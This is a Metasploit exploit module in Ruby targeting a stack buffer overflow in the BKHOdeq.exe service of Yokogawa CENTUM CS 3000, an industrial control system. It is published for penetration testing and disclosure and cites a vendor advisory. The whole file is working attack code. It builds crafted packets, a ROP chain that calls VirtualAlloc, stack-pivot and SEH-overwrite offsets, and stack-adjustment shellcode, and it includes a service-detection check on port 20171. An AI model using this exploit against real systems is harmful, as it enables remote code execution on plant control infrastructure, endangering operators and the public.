##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yokogawa CENTUM CS 3000 BKHOdeq.exe Buffer 
Overflow',
      'Description'    => %q{
        This module exploits a stack based buffer overflow in Yokogawa 
CENTUM CS 3000. The vulnerability
        exists in the service BKHOdeq.exe when handling specially 
crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 
over Windows XP SP3 and Windows
        2003 SP2.
      },
      'Author'         =>
        [
          'juan vazquez',
          'Redsadic <julian.vilas[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'URL', 
'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],
          [ 'URL', 
'https://community.rapid7.com/community/metasploit/blog/2014/03/10/yokogawa-centum-cs3000-vulnerabilities' 
]
        ],
      'Payload'        =>
        {
          'Space'       => 6000,
          'DisableNops' => true,
          'BadChars'    => ":\r\n"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Yokogawa CENTUM CS 3000 R3.08.50 / Windows [ XP SP3 / 2003 
SP2 ]',
            {
              'Ret'    => 0x0042068e, # stackpivot from 2488 BKHOdeq.exe 
# ADD ESP,9B8 # RETN
              'Offset' => 8660,
              'StackPivotAdjustment' => 108
            }
          ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 10
        },
      'DisclosureDate' => 'Mar 10 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        # Required for EIP offset
        Opt::RPORT(20171)
      ], self.class)
  end

  def check
    # It forces an huge allocation, which should fail,
    # and return back an error answer from the server
    # while parsing the packet header.
    pkt = build_pkt(0xffffffff)
    res = send_pkt(pkt)
    if valid_response?(res)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    my_payload = payload.encoded
    rop_chain = create_rop_chain

    data = rand_text(target['StackPivotAdjustment'])
    data << rop_chain
    data << stack_adjust
    data << my_payload
    data << rand_text(target['Offset'] - data.length)
    data << generate_seh_record(target.ret)

    pkt = build_pkt(data.length, data)

    print_status("Trying target #{target.name}, sending #{pkt.length} 
bytes...")
    connect
    sock.put(pkt)
    disconnect
  end

  def build_pkt(data_length, data = "")
    header = rand_text(4)             # iMark
    header << [data_length].pack("N") # Data length
    header << rand_text(4)            # NumSet
    header << rand_text(2)            # req
    header << rand_text(2)            # Unknown

    pkt = header + data

    pkt
  end

  def send_pkt(data)
    connect
    sock.put(data)
    res = sock.get_once
    disconnect

    res
  end

  def valid_response?(data)
    return false unless data
    return false unless data.length == 4
    return false unless result_code(data) == 0

    true
  end

  def result_code(data)
    data.unpack("N").first
  end

  def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer 
to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at 
stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a 
little offset

    adjust
  end

  def create_rop_chain
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      [
        0x63b27a60,  # RET # padding on XP SP3
        0x63b27a60,  # RET # padding on XP SP3
        0x63b27a5f,  # POP EAX # RETN [libbkhMsg.dll]
        0x61e761e0,  # ptr to &VirtualAlloc() [IAT LibBKCCommon.dll]
        0x61e641e4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 
[LibBKCCommon.dll]
        0x00405522,  # PUSH EAX # TEST EAX,C0330042 # POP ESI # ADD 
ESP,6D8 # RETN [BKHOdeq.exe]
      ].flatten.pack("V*")
    rop_gadgets << rand_text(1752) # Padding because of the "ADD 
ESP,6D8" instr
    rop_gadgets << [
        0x61e62aa4,  # POP EBP # RETN [LibBKCCommon.dll]
        0x61e648c0,  # & push esp # ret  [LibBKCCommon.dll]
        0x66f3243f,  # POP EBX # RETN [libBKBEqrp.dll]
        0x00000001,  # 0x00000001-> ebx
        0x61e729dd,  # POP EDX # MOV EAX,5E5FFFFF # RETN 
[LibBKCCommon.dll]
        0x00001000,  # 0x00001000-> edx
        0x63a93f6f,  # POP ECX # RETN [libbkhopx.dll]
        0x00000040,  # 0x00000040-> ecx
        0x63ad1f6a,  # POP EDI # RETN [libbkhOdeq.dll]
        0x63dd3812,  # RETN (ROP NOP) [libbkhCsSrch.dll]
        0x61e60b4c,  # POP EAX # RETN [LibBKCCommon.dll]
        0x90909090,  # nop
        0x63ae5cc3,  # PUSHAD # RETN [libbkhOdbh.dll]
      ].flatten.pack("V*")

    rop_gadgets
  end

end
